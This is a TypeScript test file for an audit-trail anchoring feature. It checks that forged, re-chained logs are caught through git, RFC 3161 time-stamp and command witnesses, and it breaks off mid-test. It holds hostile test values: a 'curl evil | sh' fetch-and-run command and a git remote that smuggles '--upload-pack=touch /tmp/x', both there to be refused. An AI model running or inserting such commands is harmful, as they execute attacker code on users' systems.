/**
 * gnomon-core: [audit.anchor] — sealed heads anchored outside the machine.
 *
 * The headline is the ninth attack of benchmarks/results/auditability-2026-08-31:
 * a full re-chain passes the hash chain, and with an anchor it is caught, with
 * the time after which it happened. The witnesses here are fakes: a local bare
 * git repository standing for the remote, an in-process time-stamp authority,
 * and a token OpenSSL's TSA produced once (conformance/anchor_rfc3161_openssl.json).
 * Nothing in this file reaches a network.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { mkdtempSync, rmSync, readFileSync, writeFileSync, existsSync, mkdirSync, readdirSync, chmodSync, cpSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { spawnSync } from "node:child_process";
import { createHash, generateKeyPairSync, sign, type KeyObject } from "node:crypto";
import { AuditTrail, recordHash, resolveAudit, verifyTrail, canonicalJson, type AuditRecord } from "./audit.js";
import {
  announceAnchorBacklog,
  collectAnchors,
  enqueueAnchor,
  flushAnchors,
  pendingAnchors,
  resolveAnchor,
  scheduleAnchorFlush,
  setAnchorScheduler,
  statementDigest,
  verifyAgainstAnchors,
  ANCHOR_FORMAT,
  type AnchorStatement,
  type ResolvedAnchor,
} from "./anchor.js";
import {
  childrenOf,
  decodeOid,
  der,
  derBytes,
  derContent,
  OID,
  parseTimeStampResponse,
  readDer,
  timeStampRequest,
  verifyTimeStampToken,
} from "./rfc3161.js";
import { RecordGuard, recordExcludesOf } from "./record_guard.js";
import { writeCheckpoint } from "./record_tamper.js";
import type { GnomonConfig } from "./config.js";

// Every git-backed test spawns a dozen git processes; on Windows and macOS CI
// runners that is seconds, not the default five.
vi.setConfig({ testTimeout: 60_000 });

let root: string;
const auditDir = () => join(root, ".gnomon-audit");

function cfg(anchor?: Record<string, unknown>): GnomonConfig {
  return {
    gnomonDir: join(root, ".gnomon"),
    config: { audit: { enabled: true, ...(anchor ? { anchor } : {}) } },
  } as unknown as GnomonConfig;
}

function git(args: string[], cwd?: string): string {
  const r = spawnSync("git", args, { cwd, encoding: "utf-8" });
  if (r.status !== 0) throw new Error(`git ${args.join(" ")}: ${r.stderr}`);
  return r.stdout.trim();
}

/** A bare repository standing for the remote. Append-only the way a real one is made so. */
function bareRemote(name = "remote.git", appendOnly = true): string {
  const p = join(root, name);
  git(["init", "--bare", "-q", p]);
  if (appendOnly) {
    git(["--git-dir", p, "config", "receive.denyNonFastForwards", "true"]);
    git(["--git-dir", p, "config", "receive.denyDeletes", "true"]);
  }
  return p;
}

/** Write and seal a trail: session_start, n tool calls, session_end. */
function sealTrail(c: GnomonConfig, id: string, n = 4): string {
  const t = new AuditTrail(resolveAudit(c), id);
  t.write("session_start", { mode: "test" });
  for (let i = 0; i < n; i++) t.write("tool_call", { tool: "read", target: `f${i}.ts`, role: "implement" });
  t.write("session_end", {});
  return t.path!;
}

const load = (p: string): AuditRecord[] =>
  readFileSync(p, "utf-8").split("\n").filter(Boolean).map((l) => JSON.parse(l) as AuditRecord);
const save = (p: string, rs: AuditRecord[]) => writeFileSync(p, rs.map((r) => JSON.stringify(r)).join("\n") + "\n");

/** The forger who understands the format: edit, then recompute every hash. */
function rechain(p: string, edit: (rs: AuditRecord[]) => void): void {
  const rs = load(p);
  edit(rs);
  let prev: string | null = null;
  for (const r of rs) {
    r.prev = prev;
    delete r.hash;
    r.hash = recordHash(r);
    prev = r.hash;
  }
  save(p, rs);
}

const anchorOf = (c: GnomonConfig): ResolvedAnchor => resolveAudit(c).anchor!;

async function report(c: GnomonConfig, trails: string[], opts: { offline?: boolean; deps?: Parameters<typeof collectAnchors>[1]["deps"] } = {}) {
  const a = anchorOf(c);
  const log = await collectAnchors(a, opts);
  return verifyAgainstAnchors(a, log, trails, { acceptUnchecked: opts.offline });
}

let captured: ResolvedAnchor[] = [];
beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), "gnomon-anchor-"));
  captured = [];
  // Deterministic: nothing is delivered behind a test's back. Tests that
  // deliver call flushAnchors and await it.
  setAnchorScheduler((s) => void captured.push(s));
});
afterEach(() => {
  setAnchorScheduler(null);
  rmSync(root, { recursive: true, force: true });
});

// ---------------------------------------------------------------------------

describe("absent [audit.anchor]: exactly the current behaviour", () => {
  it("resolves off, queues nothing, schedules nothing, excludes nothing", () => {
    const c = cfg();
    const a = anchorOf(c);
    expect(a).toMatchObject({ enabled: false, declared: false, backend: null, problems: [] });
    // Not even the host lookup: the scope is left empty.
    expect(a.scope).toBe("");
    sealTrail(c, "s1");
    expect(existsSync(join(auditDir(), "anchors"))).toBe(false);
    scheduleAnchorFlush(a);
    expect(captured).toEqual([]);
    expect(recordExcludesOf(c)).toEqual([]);
  });

  it("announces nothing and records nothing", () => {
    const said: string[] = [];
    const records: unknown[] = [];
    expect(announceAnchorBacklog(anchorOf(cfg()), { say: (l) => said.push(l), audit: { write: (_k, f) => void records.push(f) } })).toBeNull();
    expect(said).toEqual([]);
    expect(records).toEqual([]);
  });
});

describe("resolving [audit.anchor]", () => {
  const problems = (anchor: Record<string, unknown>) => anchorOf(cfg(anchor)).problems.join(" | ");

  it("a declared block that cannot work is reported, not read as off", () => {
    expect(anchorOf(cfg({}))).toMatchObject({ declared: true, enabled: false });
    expect(problems({})).toMatch(/no `backend`/);
    expect(problems({ backend: "rekor" })).toMatch(/not one of git, rfc3161, cmd/);
    expect(problems({ backend: "git" })).toMatch(/needs `remote`/);
    expect(problems({ backend: "git", remote: "x", ref: "main" })).toMatch(/not a full ref name/);
    expect(problems({ backend: "rfc3161", url: "ftp://tsa" })).toMatch(/needs `url`/);
    expect(problems({ backend: "rfc3161", url: "https://tsa.example/tsr" })).toMatch(/no `tsa_cert`/);
    expect(problems({ backend: "rfc3161", url: "https://tsa.example/tsr", tsa_cert: "nope.pem" })).toMatch(/neither PEM nor a readable file/);
    expect(problems({ backend: "cmd" })).toMatch(/needs `command`/);
    expect(problems({ backend: "git", remote: "r", timeout_sec: -1 })).toMatch(/timeout_sec/);
  });

  it("a ref outside refs/heads/ is reported: git's own protections do not cover it", () => {
    // Found by the attacker test below: a forced push to refs/gnomon/anchors
    // went through a remote with receive.denyNonFastForwards and denyDeletes.
    const a = anchorOf(cfg({ backend: "git", remote: "r", ref: "refs/gnomon/anchors" }));
    expect(a.enabled).toBe(true);
    expect(a.problems.join(" ")).toMatch(/outside refs\/heads\/.*can be force-pushed/);
    expect(anchorOf(cfg({ backend: "git", remote: "r" })).problems).toEqual([]);
  });

  it("the protection is real on refs/heads/ and absent elsewhere (git's receive-pack, measured)", () => {
    const remote = bareRemote();
    const scratch = join(root, "s.git");
    git(["init", "--bare", "-q", scratch]);
    const commit = (body: string) => {
      const blob = spawnSync("git", ["--git-dir", scratch, "hash-object", "-w", "--stdin"], { input: body, encoding: "utf-8" }).stdout.trim();
      const tree = spawnSync("git", ["--git-dir", scratch, "mktree"], { input: `100644 blob ${blob}\tanchors.jsonl\n`, encoding: "utf-8" }).stdout.trim();
      return spawnSync("git", ["--git-dir", scratch, "-c", "user.name=x", "-c", "user.email=x@x", "commit-tree", tree, "-m", body], { encoding: "utf-8" }).stdout.trim();
    };
    const a = commit("a");
    const b = commit("b");
    const push = (src: string, ref: string, force: boolean) =>
      spawnSync("git", ["--git-dir", scratch, "push", "-q", ...(force ? ["--force"] : []), remote, `${src}:${ref}`], { encoding: "utf-8" }).status;
    for (const ref of ["refs/heads/gnomon-anchors", "refs/gnomon/anchors"]) expect(push(a, ref, false)).toBe(0);
    expect(push(b, "refs/heads/gnomon-anchors", true)).not.toBe(0);
    expect(push(b, "refs/gnomon/anchors", true)).toBe(0);
  });

  it("a usable block is on, with a scope and the anchors directory in the audit directory", () => {
    const a = anchorOf(cfg({ backend: "git", remote: "../witness.git" }));
    expect(a).toMatchObject({ enabled: true, backend: "git", ref: "refs/heads/gnomon-anchors", dir: join(auditDir(), "anchors") });
    expect(a.scope).toMatch(/^[0-9a-f]{16}$/);
    expect(recordExcludesOf(cfg({ backend: "git", remote: "x" }))).toEqual([join(auditDir(), "anchors")]);
  });

  it("a remote that would be an option is refused", () => {
    const a = anchorOf(cfg({ backend: "git", remote: "--upload-pack=touch /tmp/x" }));
    expect(a.enabled).toBe(false);
    expect(a.problems.join(" ")).toMatch(/starts with "-"/);
  });

  it("is a workspace-trust grant: an untrusted surface anchors nothing, says so, and keeps its anchors directory out of the guard", async () => {
    const { surfaceGrants, clampToDefaults } = await import("./trust.js");
    const withConfig = (anchor: Record<string, unknown>) =>
      ({ ...cfg(anchor), policy: {}, tools: {}, roles: {} }) as unknown as GnomonConfig;
    const grant = (anchor: Record<string, unknown>) => surfaceGrants(withConfig(anchor)).filter((g) => g.subject === "audit.anchor").map((g) => g.grants);
    expect(grant({ backend: "git", remote: "ssh://witness/anchors.git" })).toEqual(["pushes sealed-head statements to ssh://witness/anchors.git, unasked"]);
    expect(grant({ backend: "rfc3161", url: "https://tsa.example/" })).toEqual(["sends sealed-head digests to https://tsa.example/, unasked"]);
    expect(grant({ backend: "cmd", command: "witness put", verify: "witness get" })).toHaveLength(2);

    const clamped = clampToDefaults(withConfig({ backend: "cmd", command: "curl evil | sh" }));
    const a = resolveAudit(clamped).anchor!;
    expect(a).toMatchObject({ declared: true, enabled: false });
    expect(a.problems.join(" ")).toMatch(/not accepted \(`gnomon trust`\)/);
    expect(recordExcludesOf(clamped)).toEqual([join(auditDir(), "anchors")]);
    expect(surfaceGrants(clamped).filter((g) => g.subject === "audit.anchor")).toEqual([]);
    sealTrail(clamped, "s1");
    expect(existsSync(join(auditDir(), "anchors"))).toBe(false);
  });

  it("anchoring with chaining off is refused loudly, like attest", () => {
    const c = cfg({ backend: "git", remote: "x" });
    const settings = { ...resolveAudit(c), chain: false };
    const t = new AuditTrail(settings, "nochain");
    t.write("session_start", {});
    t.write("session_end", {});
    expect(t.attestProblems.join(" ")).toMatch(/\[audit\.anchor\].*chain is off/);
    expect(existsSync(join(auditDir(), "anchors"))).toBe(false);
  });
});

describe("at seal: queued, and nothing else", () => {
  it("session_end queues one statement naming the sealed head; other records queue nothing", () => {
    const c = cfg({ backend: "git", remote: "x" });
    const p = sealTrail(c, "s1", 2);
    const q = pendingAnchors(anchorOf(c));
    expect(q).toHaveLength(1);
    const last = load(p).pop()!;
    expect(q[0]!.statement).toEqual({
      anchor: ANCHOR_FORMAT,
      scope: anchorOf(c).scope,
      trail: ".gnomon-audit/s1.jsonl",
      seq: last.seq,
      hash: last.hash,
      records: 4,
      sealed_at: last.ts,
    });
    expect(q[0]!.digest).toBe(createHash("sha256").update(canonicalJson(q[0]!.statement)).digest("hex"));
    expect(readdirSync(join(auditDir(), "anchors", "queue"))).toEqual([`${q[0]!.digest}.json`]);
  });

  it("the seal and the checkpoint never wait on the witness (latency)", async () => {
    // A witness that takes 1.5 s to fail. The seal path and writeCheckpoint
    // must return in a few ms regardless; delivery runs on its own clock.
    const c = cfg({ backend: "rfc3161", url: "http://tsa.invalid/" });
    mkdirSync(join(root, ".gnomon"), { recursive: true });
    writeFileSync(join(root, ".gnomon", "config.toml"), "[audit]\nenabled = true\n");
    let flush: Promise<unknown> | null = null;
    const slow = (async () => {
      await new Promise((r) => setTimeout(r, 1500));
      throw new Error("unreachable");
    }) as unknown as typeof fetch;
    setAnchorScheduler((s) => {
      flush = flushAnchors(s, { fetch: slow });
    });

    const base = cfg();
    const t0 = performance.now();
    sealTrail(base, "off");
    const offMs = performance.now() - t0;

    const t1 = performance.now();
    sealTrail(c, "on");
    writeCheckpoint(c);
    const onMs = performance.now() - t1;

    expect(flush).not.toBeNull();
    expect(onMs).toBeLessThan(400);
    expect(offMs).toBeLessThan(400);
    // Still queued while the witness is slow; queued, not lost, when it fails.
    expect(pendingAnchors(anchorOf(c)).length).toBe(2);
    const r = (await flush) as { delivered: number; pending: number; error?: string };
    expect(r).toMatchObject({ delivered: 0, pending: 2 });
    expect(r.error).toMatch(/unreachable/);
  });
});

// ---------------------------------------------------------------------------
// git
// ---------------------------------------------------------------------------

describe("git backend", () => {
  it("delivers queued heads as one fast-forward commit, and reads them back from the remote", async () => {
    const remote = bareRemote();
    const c = cfg({ backend: "git", remote });
    const p1 = sealTrail(c, "s1");
    const p2 = sealTrail(c, "s2");
    const r = await flushAnchors(anchorOf(c));
    expect(r).toMatchObject({ backend: "git", delivered: 2, pending: 0 });
    expect(pendingAnchors(anchorOf(c))).toEqual([]);

    const tip = git(["--git-dir", remote, "rev-parse", "refs/heads/gnomon-anchors"]);
    const lines = git(["--git-dir", remote, "show", `${tip}:anchors.jsonl`]).split("\n");
    expect(lines).toHaveLength(2);
    // Anyone holding the remote recomputes the digest with sha256 alone.
    for (const l of lines) expect(canonicalJson(JSON.parse(l))).toBe(l);

    const rep = await report(c, [p1, p2]);
    expect(rep.source).toBe("remote");
    expect(rep.trails.map((t) => t.status)).toEqual(["anchored", "anchored"]);
    expect(rep.ok).toBe(true);

    // A second flush appends on top: the history only grows.
    sealTrail(c, "s3");
    await flushAnchors(anchorOf(c));
    const next = git(["--git-dir", remote, "rev-parse", "refs/heads/gnomon-anchors"]);
    expect(git(["--git-dir", remote, "rev-parse", `${next}^`])).toBe(tip);
  });

  it("the full re-chain passes the chain and is caught by the anchor, with when", async () => {
    const remote = bareRemote();
    const c = cfg({ backend: "git", remote });
    const p = sealTrail(c, "s1");
    await flushAnchors(anchorOf(c));

    rechain(p, (rs) => {
      rs[2]!.role = "root";
    });
    const chain = verifyTrail(p);
    expect(chain).toMatchObject({ ok: true, sealed: true });

    const rep = await report(c, [p]);
    const t = rep.trails[0]!;
    expect(t.status).toBe("rechained");
    expect(t.first_mismatch).toMatchObject({ seq: 5, reason: "hash_mismatch" });
    expect(t.rewritten).toMatchObject({ from_seq: 0, to_seq: 5 });
    expect(t.rewritten!.after).toBe(t.first_mismatch!.anchored_at);
    expect(t.detail).toMatch(/change is in seq 0–5 and was made after that anchor/);
    expect(rep.ok).toBe(false);
  });

  it("an attacker who knows about anchoring: wipes the local state, cannot force the remote, re-anchors the forgery — still caught", async () => {
    const remote = bareRemote();
    const c = cfg({ backend: "git", remote });
    const p = sealTrail(c, "s1");
    await flushAnchors(anchorOf(c));
    const original = git(["--git-dir", remote, "rev-parse", "refs/heads/gnomon-anchors"]);

    rechain(p, (rs) => {
      rs[2]!.role = "root";
    });
    rmSync(join(auditDir(), "anchors"), { recursive: true, force: true });
    // A forced push of a history without the original anchor is refused.
    const scratch = join(root, "scratch.git");
    git(["init", "--bare", "-q", scratch]);
    const blob = spawnSync("git", ["--git-dir", scratch, "hash-object", "-w", "--stdin"], { input: "{}\n", encoding: "utf-8" }).stdout.trim();
    const tree = spawnSync("git", ["--git-dir", scratch, "mktree"], { input: `100644 blob ${blob}\tanchors.jsonl\n`, encoding: "utf-8" }).stdout.trim();
    const forged = spawnSync("git", ["--git-dir", scratch, "-c", "user.name=x", "-c", "user.email=x@x", "commit-tree", tree, "-m", "x"], { encoding: "utf-8" }).stdout.trim();
    const force = spawnSync("git", ["--git-dir", scratch, "push", "--force", remote, `${forged}:refs/heads/gnomon-anchors`], { encoding: "utf-8" });
    expect(force.status).not.toBe(0);
    expect(git(["--git-dir", remote, "rev-parse", "refs/heads/gnomon-anchors"])).toBe(original);

    // The forged head is anchored too, by the attacker, as gnomon would.
    const last = load(p).pop()!;
    enqueueAnchor(anchorOf(c), p, last, load(p).length);
    expect((await flushAnchors(anchorOf(c))).delivered).toBe(1);

    const t = (await report(c, [p])).trails[0]!;
    expect(t.status).toBe("rechained");
    expect(t.reanchored).toBeDefined();
    expect(t.detail).toMatch(/rewrite itself was anchored later/);
  });

  it("a resealed trail localises the rewrite between two anchors", async () => {
    // `gnomon guard` reseals one trail per call: each seal is an anchor.
    const remote = bareRemote();
    const c = cfg({ backend: "git", remote });
    const s = resolveAudit(c);
    const t1 = new AuditTrail(s, "guard-x");
    t1.write("session_start", {});
    t1.write("guard", { decision: "allow" });
    t1.write("session_end", {});
    const t2 = new AuditTrail(s, "guard-x", { append: true });
    t2.write("session_resume", {});
    t2.write("guard", { decision: "deny" });
    t2.write("session_end", {});
    await flushAnchors(anchorOf(c));

    rechain(t1.path!, (rs) => {
      rs[4]!.decision = "allow";
    });
    const t = (await report(c, [t1.path!])).trails[0]!;
    expect(t.status).toBe("rechained");
    expect(t.last_match?.seq).toBe(2);
    expect(t.rewritten).toMatchObject({ from_seq: 3, to_seq: 5 });
  });

  it("offline: stays queued, is announced and recorded, and is delivered once the remote is there", async () => {
    const remote = join(root, "later.git");
    const c = cfg({ backend: "git", remote });
    const p = sealTrail(c, "s1");
    const r = await flushAnchors(anchorOf(c));
    expect(r).toMatchObject({ delivered: 0, pending: 1 });
    expect(r.error).toMatch(/unreachable/);

    const said: string[] = [];
    const records: Array<Record<string, unknown>> = [];
    const b = announceAnchorBacklog(anchorOf(c), { say: (l) => said.push(l), audit: { write: (_k, f) => void records.push(f) } });
    expect(b?.pending).toBe(1);
    expect(said.join("\n")).toMatch(/not yet anchored to git/);
    expect(records).toEqual([expect.objectContaining({ id: "audit_anchor_queued" })]);
    // ...and a retry is started.
    expect(captured).toHaveLength(1);
    expect((await report(c, [p])).trails[0]!.status).toBe("pending");

    git(["init", "--bare", "-q", remote]);
    expect(await flushAnchors(anchorOf(c))).toMatchObject({ delivered: 1, pending: 0 });
    expect((await report(c, [p])).trails[0]!.status).toBe("anchored");
  });

  it("a queue a delivery is still working through is not announced as a degradation", () => {
    const c = cfg({ backend: "git", remote: join(root, "none.git") });
    sealTrail(c, "s1");
    const said: string[] = [];
    expect(announceAnchorBacklog(anchorOf(c), { say: (l) => said.push(l) })).toBeNull();
    expect(said).toEqual([]);
    // Past the grace period with no attempt at all, it is.
    const later = new Date(Date.now() + 10 * 60_000);
    expect(announceAnchorBacklog(anchorOf(c), { say: (l) => said.push(l), now: later })?.pending).toBe(1);
    expect(said.join("\n")).toMatch(/no delivery has run/);
  });

  it("a deleted anchored trail, and a rolled-back checkpoint, are findings", async () => {
    const remote = bareRemote();
    mkdirSync(join(root, ".gnomon"), { recursive: true });
    const c = cfg({ backend: "git", remote });
    const p = sealTrail(c, "gone");
    const cp = writeCheckpoint(c)!;
    await flushAnchors(anchorOf(c));
    let rep = await report(c, [p, cp.trail]);
    expect(rep.ok).toBe(true);

    rmSync(p);
    rmSync(cp.trail);
    rmSync(cp.map);
    rep = await report(c, []);
    expect(rep.missing.map((m) => m.trail)).toEqual([".gnomon-audit/gone.jsonl"]);
    expect(rep.rollback?.checkpoint).toMatch(/checkpoints\/checkpoint-/);
    expect(rep.findings.join(" ")).toMatch(/rollback/);
    expect(rep.ok).toBe(false);
  });

  it("an older checkpoint pruned in favour of a newer anchored one is not a finding", async () => {
    const remote = bareRemote();
    mkdirSync(join(root, ".gnomon"), { recursive: true });
    const c = cfg({ backend: "git", remote });
    writeCheckpoint(c);
    const second = writeCheckpoint(c)!;
    await flushAnchors(anchorOf(c));
    const rep = await report(c, [second.trail]);
    expect(rep.missing).toEqual([]);
    expect(rep.rollback).toBeUndefined();
    expect(rep.ok).toBe(true);
  });

  it("a remote whose history was rewritten since it was last read is a finding", async () => {
    const remote = bareRemote("loose.git", false);
    const c = cfg({ backend: "git", remote });
    const p = sealTrail(c, "s1");
    await flushAnchors(anchorOf(c));
    expect((await report(c, [p])).ok).toBe(true);

    // Someone with force-push rights replaces the history.
    const scratch = join(root, "scratch.git");
    git(["init", "--bare", "-q", scratch]);
    const blob = spawnSync("git", ["--git-dir", scratch, "hash-object", "-w", "--stdin"], { input: "", encoding: "utf-8" }).stdout.trim();
    const tree = spawnSync("git", ["--git-dir", scratch, "mktree"], { input: `100644 blob ${blob}\tanchors.jsonl\n`, encoding: "utf-8" }).stdout.trim();
    const forged = spawnSync("git", ["--git-dir", scratch, "-c", "user.name=x", "-c", "user.email=x@x", "commit-tree", tree, "-m", "x"], { encoding: "utf-8" }).stdout.trim();
    git(["--git-dir", scratch, "push", "-q", "--force", remote, `${forged}:refs/heads/gnomon-anchors`]);

    const rep = await report(c, [p]);
    expect(rep.findings.join(" ")).toMatch(/history was rewritten/);
    expect(rep.ok).toBe(false);
  });

  it("reads this machine's copy when the remote is unreachable, and says so", async () => {
    const remote = bareRemote();
    const c = cfg({ backend: "git", remote });
    const p = sealTrail(c, "s1");
    await flushAnchors(anchorOf(c));
    rmSync(remote, { recursive: true, force: true });
    const rep = await report(c, [p]);
    expect(rep.source).toBe("local-copy");
    expect(rep.problems.join(" ")).toMatch(/local copy instead/);
    expect(rep.trails[0]!.status).toBe("unchecked");
    expect(rep.ok).toBe(false);
    // Asked for explicitly, the local copy is accepted.
    expect((await report(c, [p], { offline: true })).ok).toBe(true);
  });

  it("anchors from another checkout sharing the witness are counted, not judged", async () => {
    const remote = bareRemote();
    const c = cfg({ backend: "git", remote });
    const p = sealTrail(c, "s1");
    const a = anchorOf(c);
    await flushAnchors(a);
    const elsewhere: ResolvedAnchor = { ...a, scope: "0123456789abcdef" };
    const last = load(p).pop()!;
    enqueueAnchor(elsewhere, join(root, ".gnomon-audit", "theirs.jsonl"), last, 9);
    await flushAnchors(elsewhere);
    const rep = await report(c, [p]);
    expect(rep.other_scopes).toBe(1);
    expect(rep.missing).toEqual([]);
    expect(rep.ok).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// rfc3161
// ---------------------------------------------------------------------------

/**
 * An in-process time-stamp authority: an EC P-256 key, no certificates. Its
 * public key is what a surface pins. `mode` breaks it on purpose.
 */
function fakeTsa(key: KeyObject, mode: "ok" | "refuse" | "wrong-imprint" = "ok"): typeof fetch {
  let serial = 1;
  return (async (_url: unknown, init?: RequestInit) => {
    const req = readDer(Buffer.from(init!.body as Uint8Array));
    const [, imprint, nonce] = childrenOf(req);
    if (mode === "refuse") return new Response(new Uint8Array(der.seq(der.seq(der.int(2)))), { status: 200 });
    let imprintBytes = Buffer.from(derBytes(imprint!));
    if (mode === "wrong-imprint") {
      imprintBytes = der.seq(der.seq(der.oid(OID.sha256), der.null()), der.octet(Buffer.alloc(32, 7)));
    }
    const tst = der.seq(der.int(1), der.oid("1.2.3.4.1"), imprintBytes, der.int(serial++), der.gtime(new Date()), Buffer.from(derBytes(nonce!)));
    const attrs = [
      der.seq(der.oid(OID.contentType), der.set(der.oid(OID.tstInfo))),
      der.seq(der.oid(OID.messageDigest), der.set(der.octet(createHash("sha256").update(tst).digest()))),
    ];
    const signature = sign("sha256", der.set(...attrs), key);
    const signerInfo = der.seq(
      der.int(1),
      der.seq(der.seq(), der.int(1)),
      der.seq(der.oid(OID.sha256)),
      der.ctx(0, Buffer.concat(attrs)),
      der.seq(der.oid(OID.ecdsaSha256)),
      der.octet(signature)
    );
    const signedData = der.seq(
      der.int(3),
      der.set(der.seq(der.oid(OID.sha256))),
      der.seq(der.oid(OID.tstInfo), der.ctx(0, der.octet(tst))),
      der.set(signerInfo)
    );
    const resp = der.seq(der.seq(der.int(0)), der.seq(der.oid(OID.signedData), der.ctx(0, signedData)));
    return new Response(new Uint8Array(resp), { status: 200, headers: { "content-type": "application/timestamp-reply" } });
  }) as unknown as typeof fetch;
}

function tsaKeys() {
  const { privateKey, publicKey } = generateKeyPairSync("ec", { namedCurve: "prime256v1" });
  return { privateKey, pin: publicKey.export({ format: "pem", type: "spki" }).toString() };
}

describe("rfc3161 backend", () => {
  it("builds a request OpenSSL reads: v1, sha256 imprint, nonce, certReq", () => {
    const digest = "ab".repeat(32);
    const req = readDer(timeStampRequest(digest, Buffer.from("0102030405060708", "hex")));
    const [version, imprint, nonce, certReq] = childrenOf(req);
    expect(derContent(version!)).toEqual(Buffer.from([1]));
    const [alg, hashed] = childrenOf(imprint!);
    expect(decodeOid(childrenOf(alg!)[0]!)).toBe(OID.sha256);
    expect(derContent(hashed!).toString("hex")).toBe(digest);
    expect(derContent(nonce!).toString("hex")).toBe("0102030405060708");
    expect(derContent(certReq!)).toEqual(Buffer.from([0xff]));
  });

  it("verifies a real OpenSSL TSA token offline: RSA, the TSA certificate embedded, the root pinned", () => {
    const fx = JSON.parse(readFileSync(join(process.cwd(), "..", "..", "conformance", "anchor_rfc3161_openssl.json"), "utf-8"));
    const resp = parseTimeStampResponse(Buffer.from(fx.response_base64, "base64"));
    expect(resp.status).toBe(0);
    const digest = statementDigest(fx.statement);
    expect(digest).toBe(fx.digest);
    const ok = verifyTimeStampToken(resp.token!, { digestHex: digest, pinned: fx.root_certificate });
    expect(ok).toMatchObject({ valid: true, checked: true, signer: "CN=gnomon test TSA" });
    expect(ok.info?.gen_time).toBe(fx.expect.gen_time);
    // Pinning the TSA's own certificate works too.
    expect(verifyTimeStampToken(resp.token!, { digestHex: digest, pinned: fx.tsa_certificate }).valid).toBe(true);
    // Each of these is a definite finding, not "could not check".
    expect(verifyTimeStampToken(resp.token!, { digestHex: "00".repeat(32), pinned: fx.root_certificate })).toMatchObject({ valid: false, checked: true });
    const flipped = Buffer.from(resp.token!);
    flipped[flipped.length - 5] ^= 1;
    expect(verifyTimeStampToken(flipped, { digestHex: digest, pinned: fx.root_certificate })).toMatchObject({ valid: false, checked: true });
    const other = tsaKeys().pin;
    expect(verifyTimeStampToken(resp.token!, { digestHex: digest, pinned: other })).toMatchObject({ valid: false, checked: true });
    // Nothing pinned: the imprint is checked, the signer is not, and it says so.
    expect(verifyTimeStampToken(resp.token!, { digestHex: digest, pinned: null })).toMatchObject({ valid: true, checked: false });
  });

  it("delivers to the authority, keeps the token, and catches the re-chain with the authority's time", async () => {
    const { privateKey, pin } = tsaKeys();
    const c = cfg({ backend: "rfc3161", url: "http://tsa.test/", tsa_cert: pin });
    const p = sealTrail(c, "s1");
    const r = await flushAnchors(anchorOf(c), { fetch: fakeTsa(privateKey) });
    expect(r).toMatchObject({ delivered: 1, pending: 0 });
    let rep = await report(c, [p]);
    expect(rep.source).toBe("receipts");
    expect(rep.trails[0]!.status).toBe("anchored");
    expect(rep.ok).toBe(true);

    rechain(p, (rs) => {
      rs[1]!.target = "secrets.env";
    });
    rep = await report(c, [p]);
    expect(rep.trails[0]!.status).toBe("rechained");
    expect(rep.trails[0]!.first_mismatch!.via).toMatch(/^rfc3161 serial /);
  });

  it("a receipt edited on disk does not verify", async () => {
    const { privateKey, pin } = tsaKeys();
    const c = cfg({ backend: "rfc3161", url: "http://tsa.test/", tsa_cert: pin });
    const p = sealTrail(c, "s1");
    await flushAnchors(anchorOf(c), { fetch: fakeTsa(privateKey) });
    // Rewrite the trail AND the receipt's statement to match it: the token
    // still time-stamps the original digest.
    rechain(p, (rs) => {
      rs[1]!.target = "x";
    });
    const file = join(auditDir(), "anchors", "receipts.jsonl");
    const rec = JSON.parse(readFileSync(file, "utf-8").trim());
    const last = load(p).pop()!;
    rec.statement = { ...rec.statement, hash: last.hash };
    rec.digest = statementDigest(rec.statement as AnchorStatement);
    writeFileSync(file, `${JSON.stringify(rec)}\n`);
    const t = (await report(c, [p])).trails[0]!;
    expect(t.status).toBe("invalid");
    expect(t.detail).toMatch(/time-stamps/);
  });

  it("without a pinned certificate the tokens are kept and reported unchecked", async () => {
    const { privateKey } = tsaKeys();
    const c = cfg({ backend: "rfc3161", url: "http://tsa.test/" });
    const p = sealTrail(c, "s1");
    await flushAnchors(anchorOf(c), { fetch: fakeTsa(privateKey) });
    const rep = await report(c, [p]);
    expect(rep.trails[0]!.status).toBe("unchecked");
    expect(rep.ok).toBe(false);
  });

  it("an authority that refuses, or answers for another digest, leaves the head queued", async () => {
    const { privateKey, pin } = tsaKeys();
    const c = cfg({ backend: "rfc3161", url: "http://tsa.test/", tsa_cert: pin });
    sealTrail(c, "s1");
    let r = await flushAnchors(anchorOf(c), { fetch: fakeTsa(privateKey, "refuse") });
    expect(r).toMatchObject({ delivered: 0, pending: 1 });
    expect(r.error).toMatch(/refused \(status 2\)/);
    r = await flushAnchors(anchorOf(c), { fetch: fakeTsa(privateKey, "wrong-imprint") });
    expect(r.error).toMatch(/does not verify/);
    expect(pendingAnchors(anchorOf(c))).toHaveLength(1);
  });

  it("a head sealed while a delivery runs goes out with that delivery", async () => {
    const { privateKey, pin } = tsaKeys();
    const c = cfg({ backend: "rfc3161", url: "http://tsa.test/", tsa_cert: pin });
    sealTrail(c, "s1");
    const tsa = fakeTsa(privateKey);
    let sealed = false;
    const during = (async (url: string, init?: RequestInit) => {
      if (!sealed) {
        sealed = true;
        sealTrail(c, "s2");
      }
      return tsa(url, init);
    }) as unknown as typeof fetch;
    expect(await flushAnchors(anchorOf(c), { fetch: during })).toMatchObject({ delivered: 2, pending: 0 });
  });

  it("a token signed by another key is refused at delivery", async () => {
    const { privateKey } = tsaKeys();
    const c = cfg({ backend: "rfc3161", url: "http://tsa.test/", tsa_cert: tsaKeys().pin });
    sealTrail(c, "s1");
    const r = await flushAnchors(anchorOf(c), { fetch: fakeTsa(privateKey) });
    expect(r.error).toMatch(/signature does not verify/);
  });
});

// ---------------------------------------------------------------------------
// cmd
// ---------------------------------------------------------------------------

describe("cmd backend", () => {
  // A witness the agent cannot write, stood for by a file outside the
  // workspace: the command appends the digest, the verifier looks it up.
  const witness = () => join(root, "..", `${root.split(/[\\/]/).pop()}-witness.txt`);
  const script = (name: string, body: string) => {
    const f = join(root, name);
    writeFileSync(f, body);
    chmodSync(f, 0o755);
    return `"${process.execPath}" "${f}"`;
  };

  afterEach(() => rmSync(witness(), { force: true }));

  it("delivers through the command and verifies through the verifier", async () => {
    const w = JSON.stringify(witness());
    const command = script("anchor.mjs", `import { appendFileSync, readFileSync } from "node:fs"; const d = readFileSync(0, "utf-8"); appendFileSync(${w}, d + "\\n"); process.stdout.write("witness-receipt:" + d.slice(0, 8));`);
